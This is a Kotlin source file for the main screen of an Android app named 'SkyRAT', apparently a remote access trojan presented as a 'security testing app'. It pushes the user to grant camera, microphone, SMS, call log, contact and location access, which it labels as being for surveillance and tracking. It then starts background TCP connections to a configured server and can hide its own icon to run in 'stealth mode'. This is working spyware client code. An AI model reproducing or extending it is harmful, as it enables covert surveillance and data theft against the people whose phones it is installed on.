package com.techsky.skyrat

import android.Manifest
import android.content.Context
import android.content.SharedPreferences
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "MainActivityClass"
        private const val PREFS_NAME = "app_state"
        private const val KEY_SETUP_COMPLETE = "setup_complete"
        private const val KEY_IS_HIDDEN = "is_hidden"
        private const val KEY_PERMISSIONS_GRANTED = "permissions_granted"
        private const val PERMISSION_REQUEST_CODE = 1001
        private var setupComplete = false
    }

    private lateinit var context: Context
    private lateinit var activity: MainActivity
    private lateinit var sharedPrefs: SharedPreferences

    // FIXED: Complete permissions array with ALL required permissions including CAMERA
    private val requiredPermissions = arrayOf(
        // === CAMERA & AUDIO (for video/audio recording) ===
        Manifest.permission.CAMERA,                    // FIXED: Added missing camera permission
        Manifest.permission.RECORD_AUDIO,

        // === STORAGE PERMISSIONS ===
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_EXTERNAL_STORAGE,

        // === COMMUNICATION DATA ===
        Manifest.permission.READ_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,

        // === PHONE STATE ===
        Manifest.permission.READ_PHONE_STATE,

        // === LOCATION ===
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,

        // === SYSTEM PERMISSIONS ===
        Manifest.permission.VIBRATE,
        Manifest.permission.ACCESS_NETWORK_STATE,
        Manifest.permission.RECEIVE_BOOT_COMPLETED,
        Manifest.permission.WAKE_LOCK,
        Manifest.permission.SYSTEM_ALERT_WINDOW,

        // === OPTIONAL ADVANCED PERMISSIONS ===
        Manifest.permission.SEND_SMS,
        Manifest.permission.CALL_PHONE,
        Manifest.permission.WRITE_CONTACTS,
        Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS

    ).let { permissions ->
        // Add version-specific permissions
        when {
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU -> {
                // Android 13+ permissions
                permissions + arrayOf(
                    Manifest.permission.READ_MEDIA_IMAGES,
                    Manifest.permission.READ_MEDIA_VIDEO,
                    Manifest.permission.READ_MEDIA_AUDIO,
                    Manifest.permission.POST_NOTIFICATIONS,
                    Manifest.permission.READ_PHONE_NUMBERS
                )
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.R -> {
                // Android 11+ permissions
                permissions + arrayOf(
                    Manifest.permission.MANAGE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_PHONE_NUMBERS
                )
            }
            Build.VERSION.SDK_INT >= Build.VERSION_CODES.O -> {
                // Android 8+ permissions
                permissions + arrayOf(
                    Manifest.permission.READ_PHONE_NUMBERS
                )
            }
            else -> permissions
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        context = applicationContext
        activity = this
        sharedPrefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)

        Log.d(TAG, "MainActivity created - Server: ${Config.IP}:${Config.PORT}")
        Log.d(TAG, "Total permissions to request: ${requiredPermissions.size}")

        setContentView(R.layout.activity_main)

        // Check setup and permission status
        setupComplete = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        val permissionsGranted = sharedPrefs.getBoolean(KEY_PERMISSIONS_GRANTED, false)

        when {
            !permissionsGranted -> {
                Log.d(TAG, "Permissions not granted, requesting permissions")
                requestAllPermissions()
            }
            !setupComplete -> {
                Log.d(TAG, "Permissions granted, starting setup")
                startSetupProcess()
            }
            else -> {
                Log.d(TAG, "Setup completed and permissions granted")
                // Check if app should be hidden
                handleAppVisibility()
            }
        }
    }

    private fun requestAllPermissions() {
        val missingPermissions = requiredPermissions.filter { permission ->
            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
        }

        if (missingPermissions.isEmpty()) {
            Log.d(TAG, "All permissions already granted")
            onPermissionsGranted()
            return
        }

        Log.d(TAG, "Requesting ${missingPermissions.size} permissions:")
        missingPermissions.forEach {
            Log.d(TAG, "  - ${it.substringAfterLast('.')}")
        }

        // Show detailed explanation for critical permissions
        val criticalPermissions = missingPermissions.filter {
            it in listOf(
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_PHONE_STATE
            )
        }

        val message = if (criticalPermissions.isNotEmpty()) {
            """
                This security testing app requires multiple permissions to demonstrate Android security concepts:
                
                🎥 Camera & Microphone: For surveillance testing
                📁 Storage: For file system analysis  
                📱 SMS & Calls: For communication data access
                📍 Location: For tracking capabilities
                👥 Contacts: For social graph analysis
                
                Critical permissions needed:
                ${criticalPermissions.joinToString("\n") { "• ${it.substringAfterLast('.')}" }}
                
                Please grant ALL permissions for complete functionality.
            """.trimIndent()
        } else {
            "This app needs several permissions to function properly. Please grant all permissions when prompted."
        }

        AlertDialog.Builder(this)
            .setTitle("Permissions Required")
            .setMessage(message)
            .setPositiveButton("Grant Permissions") { _, _ ->
                ActivityCompat.requestPermissions(
                    this,
                    missingPermissions.toTypedArray(),
                    PERMISSION_REQUEST_CODE
                )
            }
            .setNegativeButton("Exit") { _, _ ->
                finish()
            }
            .setCancelable(false)
            .show()
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == PERMISSION_REQUEST_CODE) {
            val granted = grantResults.count { it == PackageManager.PERMISSION_GRANTED }
            val total = grantResults.size

            Log.d(TAG, "Permissions result: $granted/$total granted")

            if (granted == total) {
                Log.d(TAG, "All permissions granted!")
                onPermissionsGranted()
            } else {
                val denied = permissions.filterIndexed { index, _ ->
                    grantResults[index] != PackageManager.PERMISSION_GRANTED
                }

                Log.w(TAG, "Some permissions denied: ${denied.joinToString { it.substringAfterLast('.') }}")
                showPermissionDeniedDialog(denied)
            }
        }
    }

    private fun showPermissionDeniedDialog(deniedPermissions: List<String>) {
        val criticalPermissions = listOf(
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_PHONE_STATE
        )

        val hasCriticalDenials = deniedPermissions.any { it in criticalPermissions }
        val criticalDenied = deniedPermissions.filter { it in criticalPermissions }

        if (hasCriticalDenials) {
            AlertDialog.Builder(this)
                .setTitle("Critical Permissions Denied")
                .setMessage("""
                    Some critical permissions were denied. The app functionality will be limited.
                    
                    Critical denied permissions:
                    ${criticalDenied.joinToString("\n") { "❌ ${it.substringAfterLast('.')}" }}
                    
                    Features affected:
                    ${getCriticalFeatureImpact(criticalDenied)}
                    
                    Would you like to try again?
                """.trimIndent())
                .setPositiveButton("Retry") { _, _ ->
                    requestAllPermissions()
                }
                .setNegativeButton("Continue Anyway") { _, _ ->
                    Toast.makeText(this, "Some features will not work without permissions", Toast.LENGTH_LONG).show()
                    onPermissionsGranted()
                }
                .setNeutralButton("Exit") { _, _ ->
                    finish()
                }
                .setCancelable(false)
                .show()
        } else {
            // Only non-critical permissions denied
            Toast.makeText(this, "Some optional permissions denied - continuing with limited functionality", Toast.LENGTH_SHORT).show()
            onPermissionsGranted()
        }
    }

    private fun getCriticalFeatureImpact(deniedPermissions: List<String>): String {
        val impacts = mutableListOf<String>()

        if (Manifest.permission.CAMERA in deniedPermissions) {
            impacts.add("• Video recording disabled")
        }
        if (Manifest.permission.RECORD_AUDIO in deniedPermissions) {
            impacts.add("• Audio recording disabled")
        }
        if (Manifest.permission.READ_SMS in deniedPermissions) {
            impacts.add("• SMS access disabled")
        }
        if (Manifest.permission.READ_CALL_LOG in deniedPermissions) {
            impacts.add("• Call logs access disabled")
        }
        if (Manifest.permission.READ_CONTACTS in deniedPermissions) {
            impacts.add("• Contacts access disabled")
        }
        if (Manifest.permission.READ_PHONE_STATE in deniedPermissions) {
            impacts.add("• Device info limited")
        }

        return impacts.joinToString("\n")
    }

    private fun onPermissionsGranted() {
        // Mark permissions as granted
        sharedPrefs.edit().putBoolean(KEY_PERMISSIONS_GRANTED, true).apply()

        // Log granted permissions for debugging
        val grantedPermissions = requiredPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        Log.d(TAG, "Granted permissions: ${grantedPermissions.size}/${requiredPermissions.size}")

        // Log critical permissions status
        logCriticalPermissions()

        // Now proceed with setup
        if (!setupComplete) {
            startSetupProcess()
        } else {
            handleAppVisibility()
        }
    }

    private fun logCriticalPermissions() {
        val criticalPermissions = mapOf(
            "Camera" to Manifest.permission.CAMERA,
            "Record Audio" to Manifest.permission.RECORD_AUDIO,
            "Read SMS" to Manifest.permission.READ_SMS,
            "Read Call Log" to Manifest.permission.READ_CALL_LOG,
            "Read Contacts" to Manifest.permission.READ_CONTACTS,
            "Read Phone State" to Manifest.permission.READ_PHONE_STATE
        )

        Log.d(TAG, "=== CRITICAL PERMISSIONS STATUS ===")
        criticalPermissions.forEach { (name, permission) ->
            val granted = ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
            Log.d(TAG, "$name: ${if (granted) "✅ GRANTED" else "❌ DENIED"}")
        }
        Log.d(TAG, "=====================================")
    }

    private fun startSetupProcess() {
        Log.d(TAG, "Starting setup process")

        val dialog = AlertDialog.Builder(this)
            .setTitle("System Setup")
            .setMessage("Initializing security testing environment...")
            .setCancelable(false)
            .create()

        dialog.show()

        // Simulate setup time and then complete
        CoroutineScope(Dispatchers.Main).launch {
            delay(3000) // 3 second setup delay

            try {
                completeSetup()
                dialog.dismiss()
            } catch (e: Exception) {
                Log.e(TAG, "Setup failed: ${e.message}", e)
                dialog.dismiss()
                Toast.makeText(context, "Setup failed: ${e.message}", Toast.LENGTH_LONG).show()
                finish()
            }
        }
    }

    private fun completeSetup() {
        if (setupComplete) {
            Log.d(TAG, "Setup already completed")
            handleAppVisibility()
            return
        }

        Log.d(TAG, "Completing setup process")
        setupComplete = true

        // Save setup completion state
        sharedPrefs.edit().putBoolean(KEY_SETUP_COMPLETE, true).apply()

        Toast.makeText(this, "Starting security testing services...", Toast.LENGTH_SHORT).show()

        try {
            // Initialize job scheduler
            Functions(activity).jobScheduler(applicationContext)
            Log.d(TAG, "Job scheduler initialized")

            // Start background services
            startBackgroundServices()

            Toast.makeText(context, "Setup complete. Services running.", Toast.LENGTH_SHORT).show()

            // Handle app icon visibility with delay
            CoroutineScope(Dispatchers.Main).launch {
                delay(3000) // Wait 3 seconds so user can see completion

                handleAppVisibility()
            }

        } catch (e: Exception) {
            Log.e(TAG, "Error starting services: ${e.message}", e)
            Toast.makeText(this, "Error starting services: ${e.message}", Toast.LENGTH_SHORT).show()
            finish()
        }
    }

    private fun handleAppVisibility() {
        if (Config.ICON) {
            Log.d(TAG, "Hiding app icon as configured")

            // Hide app icon and keep it hidden
            Functions(activity).hideAppIcon(context)

            // Save the hidden state in SharedPreferences
            sharedPrefs.edit().putBoolean(KEY_IS_HIDDEN, true).apply()

            Toast.makeText(context, "Running in stealth mode", Toast.LENGTH_SHORT).show()
        } else {
            Log.d(TAG, "App icon will remain visible as configured")
            Toast.makeText(context, "Security testing environment ready", Toast.LENGTH_SHORT).show()
        }

        // Finish the activity after a short delay
        CoroutineScope(Dispatchers.Main).launch {
            delay(2000)
            finish()
        }
    }

    private fun startBackgroundServices() {
        Log.d(TAG, "Starting background services")

        try {
            // Start TCP connection in background using both methods for redundancy
            CoroutineScope(Dispatchers.IO).launch {
                // Method 1: Direct background manager
                try {
                    val backgroundManager = BackgroundTcpManager(context)
                    backgroundManager.startConnection()
                    Log.d(TAG, "Background TCP manager started")
                } catch (e: Exception) {
                    Log.e(TAG, "Background TCP manager failed: ${e.message}")
                }

                // Method 2: Service fallback
                delay(5000) // Wait 5 seconds before starting service backup
                try {
                    val serviceIntent = android.content.Intent(context, MainService::class.java)
                    startService(serviceIntent)
                    Log.d(TAG, "MainService started as backup")
                } catch (e: Exception) {
                    Log.e(TAG, "MainService failed: ${e.message}")
                }
            }

            // Initialize Jumper for additional connectivity monitoring
            CoroutineScope(Dispatchers.IO).launch {
                delay(3000)
                try {
                    val jumper = Jumper(context)
                    jumper.init()
                    Log.d(TAG, "Jumper initialized")
                } catch (e: Exception) {
                    Log.e(TAG, "Jumper failed: ${e.message}")
                }
            }

        } catch (e: Exception) {
            Log.e(TAG, "Failed to start background services: ${e.message}", e)
        }
    }

    override fun onResume() {
        super.onResume()

        // Only check hidden state if setup is complete AND permissions are granted
        val isHidden = sharedPrefs.getBoolean(KEY_IS_HIDDEN, false)
        val setupDone = sharedPrefs.getBoolean(KEY_SETUP_COMPLETE, false)
        val permissionsGranted = sharedPrefs.getBoolean(KEY_PERMISSIONS_GRANTED, false)

        if (isHidden && setupDone && permissionsGranted && Config.ICON) {
            Log.d(TAG, "App resumed but should be hidden, finishing")
            finish()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        Log.d(TAG, "MainActivity destroyed")
    }

    // === UTILITY METHODS ===

    // Method to check specific permission during runtime
    private fun hasPermission(permission: String): Boolean {
        return ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED
    }

    // Method to check if video recording is possible
    fun canRecordVideo(): Boolean {
        return hasPermission(Manifest.permission.CAMERA) &&
                hasPermission(Manifest.permission.RECORD_AUDIO)
    }

    // Method to check if audio recording is possible
    fun canRecordAudio(): Boolean {
        return hasPermission(Manifest.permission.RECORD_AUDIO)
    }

    // Method to get permissions status summary
    fun getPermissionsStatus(): String {
        val granted = requiredPermissions.count { hasPermission(it) }
        val total = requiredPermissions.size

        return "Permissions: $granted/$total granted"
    }

    // Debug method to reset app state (for testing)
    private fun resetAppState() {
        Log.d(TAG, "Resetting app state for debugging")
        sharedPrefs.edit().clear().apply()
        setupComplete = false
    }

    // Debug method to list all permission statuses
    private fun debugPermissions() {
        Log.d(TAG, "=== ALL PERMISSIONS STATUS ===")
        requiredPermissions.forEach { permission ->
            val granted = hasPermission(permission)
            val name = permission.substringAfterLast('.')
            Log.d(TAG, "$name: ${if (granted) "✅" else "❌"}")
        }
        Log.d(TAG, "=============================")
    }
}